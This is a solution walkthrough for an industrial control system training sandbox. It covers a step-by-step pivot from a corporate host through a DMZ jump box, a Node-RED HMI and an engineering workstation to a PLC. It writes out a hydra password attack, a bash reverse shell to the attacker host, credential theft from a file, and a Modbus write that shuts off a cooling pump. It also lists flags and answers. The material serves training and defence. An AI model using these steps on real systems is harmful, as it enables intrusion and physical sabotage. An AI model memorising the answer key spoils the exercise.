# Complex OT Sandbox — Training Solution Walkthrough

This document provides the complete step-by-step solutions for all training levels of the **Industrial Control Hijack and Pivoting Sandbox** (`complex-operator-ot-sandbox`) training scenario.

---

## 📖 1. Scenario Architecture & Components

To understand this exploit and sabotage scenario, you must first understand the core components of an Operational Technology (OT) and Industrial Control System (ICS) environment modeled in the sandbox:

### A. Programmable Logic Controller (PLC)

* **Definition:** A ruggedized, specialized industrial computer designed to monitor inputs (from sensors like thermometers or flow meters) and control outputs (like turning on pumps, opening valves, or running motors) based on a programmed loop logic.
* **Sandbox Role (`openplc-node`):** Runs OpenPLC (an open-source software PLC). It controls a simulated cooling loop pump by listening on **Modbus TCP port 502** and managing Holding Register 0 (PLC register 40001). Setting this register to `1` enables the pump; setting it to `0` disables it.

### B. Engineering Workstation (EWS)

* **Definition:** A high-privileged computer system used by control system engineers and technicians to write programs, modify PLC control logic, configure field devices, and monitor the health of the industrial network. It holds direct network and protocol access to the PLCs.
* **Sandbox Role (`engineering-station`):** Represents the EWS. Under secure industrial network rules, it is the **only host** authorized to send Modbus command traffic directly to the PLC. This makes the EWS a high-value target for lateral movement.

### C. SCADA HMI (Implemented via Node-RED)

* **SCADA HMI Definition:** A graphical interface and supervisory control system that gathers real-time telemetry from PLCs and field equipment, displaying it to operators on a screen. It allows operators to view process states and issue manual adjustments or overrides (e.g., starting a motor).
* **Node-RED (The Underlying Tool):** Node-RED is a flow-based visual programming tool commonly used in industrial IoT and SCADA environments to bind controllers, dashboards, databases, and APIs together.
* **Sandbox Integration (`scada-hmi`):** In this scenario, **Node-RED is the specific software engine running on the `scada-hmi` host VM**. It acts as the visual HMI panel. Leaving its administrative editor unauthenticated represents a critical initial entry vulnerability (Remote Code Execution) that the attacker exploits to gain a foothold.

---

## 🌐 2. Real-World Realism & Network Segmentation (Industrial Fidelity)

This scenario is designed to replicate high-profile state-sponsored cyber-physical attacks (such as the **2015 Ukraine Power Grid attack** and the **2021 Oldsmar, Florida Water Plant breach**) rather than generic IT capture-the-flag exercises. It mirrors real-world networks in four key ways:

### A. Strict Purdue Model & IDMZ Segmentation

The network layout enforces strict division based on the **Purdue Model (incorporated into the ISA/IEC 62443 standard for network zone segmentation)** using a central router (`ot-gateway`):

* **Isolation of the Control Network:** The attacker (on Corporate Level 4/5) has **no direct path** to the SCADA HMI (Level 3), the EWS (Level 2) or the PLC (Level 1). They cannot ping, port-scan, or exploit the SCADA dashboard directly.

* **Authorized Path Flow via IDMZ:** An intermediate **Level 3.5 Industrial DMZ (IDMZ)** subnet (`dmz-net`) and a Jump Host VM (`dmz-jump`) are introduced.
  * Attacker (Corporate) is only allowed to SSH into the `dmz-jump` host.
  * The `dmz-jump` host is authorized to connect to the SCADA HMI (Operations Level 3) on port 1880 (Node-RED).
  * SCADA HMI (Level 3) is allowed to SSH (port 22) into the EWS (Level 2).
  * EWS (Level 2) is the only node allowed to send Modbus TCP packets (port 502) to the PLC (Level 1).

* **This segmenting mirrors real-world production networks** where critical field equipment is segregated behind firewalls.

### B. Exploitation via Credential Hygiene Failures

Rather than using exotic zero-day exploits, the attacker pivots through the network boundaries by exploiting common human errors and credential hygiene failures:

* The attacker compromises the unauthenticated Node-RED portal to gain initial shell access.
* Instead of hacking the SSH service of the EWS, the attacker harvests a plaintext operator backup file (`ews_credentials.txt`) left in the home directory of the SCADA host. This mirrors the Ukraine 2015 breach, where attackers harvested legitimate remote-access credentials to pivot laterally.

### C. Pentesting & Pivot Mechanics (PTY Upgrade)

Once the attacker gains shell access on the SCADA HMI, they cannot simply run SSH to connect to the EWS.

* **The Issue:** A raw reverse shell is a "dumb" connection that does not handle interactive elements (like the SSH password prompt).
* **The Realism:** The attacker must upgrade their connection to an interactive Pseudo-Terminal (PTY) using Python's pty library (`python3 -c 'import pty; pty.spawn("/bin/bash")'`). This upgrade mimics the exact procedure used by penetration testers and APT actors to handle interactive utilities.

### D. Cleartext Industrial Protocols (Modbus Insecurity)

Once the attacker reaches the high-privilege EWS, they do not hack the PLC operating system.

* **The Protocol Vulnerability:** Legacy industrial protocols (such as Modbus TCP on port 502) were designed for isolation and contain **no cryptographic authentication, encryption, or integrity checks**.
* **The Exploit:** By sending a raw, unauthenticated Modbus write command (`modbus 192.168.20.10 0=0`) directly over the network, the attacker forces the PLC to alter its memory state and shut down the physical cooling pump. This replicates the protocol injection mechanics used in malware like **Industroyer/Crashoverride** and **Stuxnet**.

---

## 3. Network Layout

| Host | Subnet | IP | Services |
|---|---|---|---|
| `attacker-host` | corporate-net | `10.10.10.50` | Kali Linux (attacker workstation) |
| `dmz-jump` | dmz-net | `192.168.50.50` | SSH Jump Host (port `22`) |
| `scada-hmi` | operations-net | `192.168.100.10` | Node-RED on port `1880` |
| `engineering-station` (EWS) | control-net | `192.168.20.20` | SSH (22), Modbus Client CLI |
| `openplc-node` (PLC) | control-net | `192.168.20.10` | OpenPLC Modbus Server (502) |
| `ot-gateway` | corporate-net / dmz-net / operations-net / control-net | `10.10.10.1` / `192.168.50.1` / `192.168.100.1` / `192.168.20.1` | Gateway firewall router |

### Firewall Rules (configured on `ot-gateway`)

* Attacker (`10.10.10.50` on `corporate-net`) is allowed to connect to `dmz-jump` (`192.168.50.50` on `dmz-net`) via SSH (port `22`).
* Attacker is **blocked** from accessing SCADA HMI (`192.168.100.10`) directly from the corporate network (forces IDMZ jump box usage).
* `dmz-jump` (`192.168.50.50`) is allowed to connect to SCADA HMI (`192.168.100.10` on `operations-net`) via port `1880` (Node-RED).
* `dmz-jump` is blocked from reaching EWS (`192.168.20.20`) and PLC (`192.168.20.10`) directly.
* SCADA HMI (`192.168.100.10`) is allowed to SSH (port `22`) into EWS (`192.168.20.20`).
* SCADA HMI is blocked from connecting to the PLC (`192.168.20.10`) directly.
* EWS (`192.168.20.20`) is allowed to send Modbus TCP (port `502`) traffic to PLC (`192.168.20.10`).

---

## Level 1: Access the Attacker Workstation

1. Select **`attacker-host`** on the topology graph.
2. Click the **Web Console** link.
3. Submit the passkey: **`start`**

---

## Level 2: IDMZ: Access the Industrial DMZ Jump Host

**Objective:** Discover and SSH into the IDMZ jump host (`dmz-jump`) using stolen credentials to pass the corporate perimeter firewall.

**Answer:** `FLAG{IDMZ_JUMP_ACCESSED}`

### Steps:

4. Open a terminal on the Kali attacker workstation.
5. Scan the IDMZ subnet (`192.168.50.0/24`) using `nmap` to locate the active jump host running SSH:

   ```bash
   nmap -p 22 --open 192.168.50.0/24
   ```

6. Locate the active jump host IP: **`192.168.50.50`**.
7. You know that the user `operator` has a weak password. Run a dictionary attack using **hydra** and the pre-deployed `/home/debian/passlist.txt` file:

   ```bash
   hydra -l operator -P passlist.txt ssh://192.168.50.50
   ```

*Output reveals cracked password:* `operator123`

8. Connect via SSH using the cracked credentials:

   ```bash
   ssh operator@192.168.50.50
   ```

*(When prompted for password, enter: `operator123`)*

9. Read the flag file in the operator's home directory to retrieve the passkey:

```bash
   cat flag.txt
   ```

*Result:* `FLAG{IDMZ_JUMP_ACCESSED}`

---

## Level 3: RECONNAISSANCE: SCADA HMI Discovery

**Objective:** Scan the operations management subnet (`192.168.100.0/24`) *from the DMZ jump host terminal* to locate the active SCADA HMI web portal IP and port.

**Answer:** `192.168.100.10:1880`

### Steps:

10. From your active SSH session on `dmz-jump` (`192.168.50.50`), run an `nmap` sweep targeting Node-RED's default port (`1880`):

   ```bash
   nmap -p 1880 --open 192.168.100.0/24
   ```

11. Note the active HMI host: **`192.168.100.10`**.
12. Submit the answer in `IP:PORT` format: **`192.168.100.10:1880`**.

---

## Level 4: EXPLOITATION: SCADA HMI Compromise (Florida Oldsmar Hack)

**Objective:** Establish an SSH tunnel from Kali through the IDMZ jump host to expose the SCADA Node-RED panel, and compromise it to read `/root/flag.txt`.

**Answer:** `FLAG{SCADA_HMI_COMPROMISED}`

### Steps:

13. Open a new terminal tab on your Kali attacker host (leaving the SSH session running).
14. Establish an **SSH local port forward** to tunnel Node-RED traffic through the jump host:

   ```bash
   ssh -L 1880:192.168.100.10:1880 operator@192.168.50.50
   ```

 *(Authenticate using password: `operator123`)*

15. Open the Kali web browser and go to `<<http://localhost:1880/`.>> This securely forwards your browser request through the DMZ into the Operations network.
16. Drag an **`inject`** node, an **`exec`** node, and a **`debug`** node onto the canvas.
17. Configure the `exec` node with the command: `cat /root/flag.txt`
18. Wire them: `inject` ──► `exec` ──► `debug` (top output port).
19. Click **Deploy** in the top right, and click the trigger button on the `inject` node.
20. Copy the flag from the debug panel: `FLAG{SCADA_HMI_COMPROMISED}`.

---

## Level 5: CREDENTIAL ACCESS: Operator Secrets

**Objective:** Search the compromised HMI filesystem to locate and extract EWS administrative credentials from `/home/debian/ews_credentials.txt`.

**Answer:** `EngineeringPass2026!`

### Steps:

21. Double-click the existing Node-RED `exec` node on your browser dashboard.
22. Change the command field to read the operator credential file:

   ```bash
   cat /home/debian/ews_credentials.txt
   ```

23. Click **Deploy** and click the inject trigger button.
24. The debug output contains:
   * **Host:** `192.168.20.20`
   * **User:** `engineer`
   * **Password:** `EngineeringPass2026!`
25. Submit the engineer password: **`EngineeringPass2026!`**.

---

## Level 6: PIVOT: EWS Lateral Pivot (Ukraine Power Grid)

**Objective:** Use the stolen credentials to SSH into EWS from the HMI, scan the control network, and locate the active PLC.

**Answer:** `192.168.20.10`

### Steps:

#### Step 1 — Start a Listener on Kali

On the Kali attacker host (`10.10.10.50`), open a terminal and start a TCP listener:

```bash
nc -nlvp 4444
```text

#### Step 2 — Deploy the Reverse Shell via Node-RED

On the Node-RED editor page (`<<http://localhost:1880/>>`):

26. Drag a new **`inject`** node and **`exec`** node onto the canvas and wire them together.
27. Configure the `exec` node with this bash reverse shell command to dial back to Kali:

   ```bash
   bash -c 'bash -i >& /dev/tcp/10.10.10.50/4444 0>&1'
   ```

28. Click **Deploy**, then click the inject trigger button.

#### Step 3 — Upgrade to a Full Interactive TTY

On the caught shell terminal on Kali, upgrade the connection to allow interactive credentials entry:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```text

Your prompt will update to `root@scada-hmi:~#`.

#### Step 4 — SSH Pivot to the EWS

From the SCADA HMI terminal, SSH into the Engineering Workstation using the stolen credentials:

```bash
ssh engineer@192.168.20.20
```text

*(Enter password `EngineeringPass2026!` when prompted)*

#### Step 5 — Scan the Control Subnet

From the EWS command line (`engineer@engineering-station`), scan the control network to target active PLCs speaking Modbus (port 502):

```bash
nmap -p 502 --open 192.168.20.0/24
```text

This isolates the target PLC at **`192.168.20.10`**.

---

## Level 7: Process Sabotage (Modbus Hijack)

**Objective:** Disable the cooling pump by writing `0` to Holding Register 0 on the PLC, and read the confirmation flag from `/var/log/safety_override.txt` on the EWS.

**Answer:** `FLAG{PUMP_DISABLED_SUCCESS}`

### Steps:

29. From the pivoted EWS terminal, run the Modbus CLI script:

   ```bash
   modbus 192.168.20.10 0=0
   ```

30. Read the safety override confirmation log:

   ```bash
    cat /var/log/safety_override.txt
    ```

31. Copy the validation flag: **`FLAG{PUMP_DISABLED_SUCCESS}`**.

---

## MITRE ATT&CK Technique Mapping

This scenario covers techniques from both **MITRE ATT&CK for ICS** and **MITRE ATT&CK Enterprise**.

### ATT&CK for ICS Techniques

| Level | Tactic | Technique ID | Technique Name | Description in Scenario |
|---|---|---|---|---|
| 2 | Lateral Movement | **T0859** | Valid Accounts | Trainee logs into the `dmz-jump` host via SSH using credentials. |
| 3 | Discovery | **T0846** | Remote System Discovery | Trainee sweeps the operations network from the DMZ host. |
| 4 | Initial Access | **T0819** | Exploit Public-Facing Application | Node-RED flow builder exposed on the SCADA HMI. |
| 4 | Execution | **T0807** | Command and Scripting Interpreter | Bash commands run via Node-RED `exec` node. |
| 5 | Collection | **T0893** | Data from Local System | Trainee reads EWS credential backup files. |
| 6 | Lateral Movement | **T0859** | Valid Accounts | Trainee SSHs from the HMI into the EWS. |
| 6 | Discovery | **T0846** | Remote System Discovery | Trainee scans the control subnet using nmap. |
| 7 | Impair Process Control | **T0855** | Unauthorized Command Message | Modbus write command writes value `0` to PLC register. |
| 7 | Impair Process Control | **T0831** | Manipulation of Control | PLC holding register forced to zero to disable pump. |

---

### ATT&CK Enterprise Techniques (IT/OT Overlap)

| Level | Tactic | Technique ID | Technique Name | Description in Scenario |
|---|---|---|---|---|
| 2 | Lateral Movement | **T1021.004** | Remote Services: SSH | SSH jump into the IDMZ host. |
| 3 | Discovery | **T1046** | Network Service Discovery | Scanning operations subnet for Node-RED port. |
| 4 | Initial Access | **T1190** | Exploit Public-Facing Application | unauthenticated Node-RED initial compromise. |
| 4 | Execution | **T1059.004** | Command and Scripting Interpreter: Unix Shell | Command execution on Node-RED. |
| 5 | Credential Access | **T1552.001** | Unsecured Credentials: Credentials In Files | Extracting plaintext passwords from filesystem backups. |
| 6 | Lateral Movement | **T1021.004** | Remote Services: SSH | SSH lateral movement from HMI into EWS. |
| 6 | Execution | **T1059.004** | Command and Scripting Interpreter: Unix Shell | PTY upgrade and reverse shell session catching. |
| 6 | Discovery | **T1046** | Network Service Discovery | Scanning control subnet for Modbus port 502. |
| 7 | Impact | **T1489** | Service Stop | Shutting down the cooling pump process logic. |

---

### Kill Chain Summary

```text
[Initial Access]       T0859 / T1021  — SSH jump through Level 3.5 IDMZ
        │
        ▼
[Exploitation]         T0819 / T1190  — Exploit unauthenticated Node-RED HMI via SSH tunnel
        │
        ▼
[Execution]            T0807 / T1059  — Command execution via exec node / reverse shell
        │
        ▼
[Collection]           T0893 / T1552  — Read plaintext credential file from SCADA host
        │
        ▼
[Lateral Movement]     T0859 / T1021  — SSH from HMI into EWS with stolen credentials
        │
        ▼
[Discovery]            T0846 / T1046  — Subnet discovery + Modbus port scan / NSE fingerprint
        │
        ▼
[Impact]               T0855 / T0831  — Unauthorized Modbus write disables cooling pump
```text
